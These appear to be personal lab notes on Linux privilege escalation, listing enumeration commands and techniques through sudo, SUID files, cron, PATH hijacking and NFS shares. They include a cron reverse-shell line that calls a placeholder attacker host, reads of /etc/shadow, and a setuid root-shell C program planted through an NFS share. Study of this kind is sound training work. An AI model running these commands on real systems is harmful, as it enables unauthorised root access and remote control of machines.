hostname
/proc/version - info about system processes
/etc/issue - info about OS
ps -A - all running processes
ps axjf - view process trree
ps aux - processes for all users
env - environmental variables
sudo -l
ls -l
id
/etc/passwd
/etc/shadow
history
ifconfig
netstat -a - all listening ports and established connections
        -at or netstat -au - lists TCP/UDP respectively
        -l - lists ports in listening mode
        -s - network usage statistics
        -t - connections with service name and PID
        -i - interface stats
        -ano - display all sockets, do not resolve names, do not display timers
find writable folders        
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

find world-executable folders
find / -perm -o x -type d 2>/dev/null

find development tools and supported languages
find / -name perl*
find / -name python*
find / -name gcc*

find files with SUID bit
find / -perm -u=s -type f 2>/dev/null

1. Kernel Exploits

2. Sudo
sudo -l

3. SUID
find / -type f -perm -04000 -ls 2>/dev/null    -   will list files that have SUID or SGID bits set
find / -perm -u=s -type f 2>/dev/null

4. Capabilities
getcap -r / 2>/dev/null

5. Cron Jobs
/etc/crontab

reverse shell example invoked with cron
#!/bin/bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

6. PATH - in Linux is an environmental variable that tells the operating system where to search for executables.
What folders are located under $PATH
Does your current user have write privileges for any of these folders?
Can you modify $PATH?
Is there a script/application you can start that will be affected by this vulnerability?

find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
find / -user root -perm -4000 -exec ls -ldb {} \;

to add /tmp to PATH:
export PATH=/tmp:$PATH

7. NFS - Network File Sharing
/etc/exports - holds NFS
If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

enumerate mountable shares
showmount -e RHOST

mount the vuln share to our attacking machine 

mkdir /tmp/backuponattackermachine
mount -o rw RHOST:/backup /tmp/backuponattackermachine

and build exec in the share

int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
 }

compile the file

gcc nfs.c -o nfs -w

set the SUID bit

chmod +s nfs
